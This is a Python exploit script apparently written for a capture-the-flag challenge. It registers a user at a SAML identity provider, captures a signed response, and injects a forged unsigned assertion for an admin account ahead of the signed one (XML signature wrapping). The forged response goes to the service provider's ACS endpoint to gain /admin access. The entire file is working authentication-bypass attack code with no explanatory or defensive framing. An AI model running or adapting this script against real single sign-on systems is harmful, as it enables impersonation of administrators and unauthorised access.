import urllib.request, urllib.parse, http.cookiejar, sys, re, base64, datetime

IDP = "http://oj-10-30-15-1-56469.adworld.xctf.org.cn"
SP  = "http://oj-10-30-15-1-44153.adworld.xctf.org.cn"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post(url, data):
    d = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=d)
    try:
        r = op.open(req, timeout=25)
        return r.getcode(), r.geturl(), r.read().decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode('utf-8','ignore')

def post_raw(url, data):
    d = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=d)
    try:
        r = op.open(req, timeout=25)
        return r.getcode(), r.geturl(), r.read().decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get('Location'), e.read().decode('utf-8','ignore')

def get(url):
    try:
        r = op.open(url, timeout=25)
        return r.getcode(), r.geturl(), r.read().decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode('utf-8','ignore')

uname = "attlab101"
email = uname + "@x.com"
post(IDP+"/register", {"username":uname,"email":email,"password":"pass123456",
    "confirmPassword":"pass123456","type":"true","displayName":"a","department":"d"})
get(IDP+"/logout")
post(IDP+"/login", {"username":uname,"password":"pass123456"})

code, u, body = get(IDP+"/saml/idp/Flag")
saml = re.search(r'name="SAMLResponse"\s+value="([^"]+)"', body).group(1)
xml = base64.b64decode(urllib.parse.unquote(saml)).decode('utf-8','ignore')

# find the original Assertion block (including its Signature) and its ID
m = re.search(r'(<saml:Assertion [^>]*ID="([^"]+)"[^>]*>.*?</saml:Assertion>)', xml, re.S)
orig_assertion = m.group(1)
orig_id = m.group(2)
print("orig assertion id:", orig_id)

# build time window
now = datetime.datetime.utcnow()
nb = (now - datetime.timedelta(minutes=1)).strftime('%Y-%m-%dT%H:%M:%S.000Z')
noa = (now + datetime.timedelta(minutes=10)).strftime('%Y-%m-%dT%H:%M:%S.000Z')

# forged assertion, no signature
fake = (
 '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
 'ID="_forged1234567890abcdef" Version="2.0" IssueInstant="%s">'
 '<saml:Issuer>http://127.0.0.1</saml:Issuer>'
 '<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">admin@rois.team</saml:NameID>'
 '<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
 '<saml:SubjectConfirmationData NotOnOrAfter="%s" Recipient="http://127.0.0.1:26000/saml/acs"/>'
 '</saml:SubjectConfirmation></saml:Subject>'
 '<saml:Conditions NotBefore="%s" NotOnOrAfter="%s"><saml:AudienceRestriction>'
 '<saml:Audience>http://127.0.0.1:26000</saml:Audience></saml:AudienceRestriction></saml:Conditions>'
 '<saml:AuthnStatement AuthnInstant="%s" SessionIndex="_s1">'
 '<saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>'
 '</saml:AuthnContext></saml:AuthnStatement>'
 '</saml:Assertion>'
) % (now.strftime('%Y-%m-%dT%H:%M:%S.000Z'), noa, nb, noa, now.strftime('%Y-%m-%dT%H:%M:%S.000Z'))

# insert fake assertion immediately after Response opening tag (before original assertion)
resp_open = re.search(r'(<samlp:Response [^>]*>)', xml).group(1)
xsw = xml.replace(resp_open, resp_open + fake, 1)
# remove any ds:Signature directly under Response if present (none). keep original assertion sig.

b64 = base64.b64encode(xsw.encode()).decode()
open("/home/kali/secpt/var/jobs/rois-run-1/ws/xsw.xml","w").write(xsw)

# submit to SP ACS
c2, loc, rb = post_raw(SP+"/saml/acs", {"SAMLResponse": b64, "RelayState": "/admin"})
print("ACS code:", c2, "loc:", loc)
print(rb[:1000])
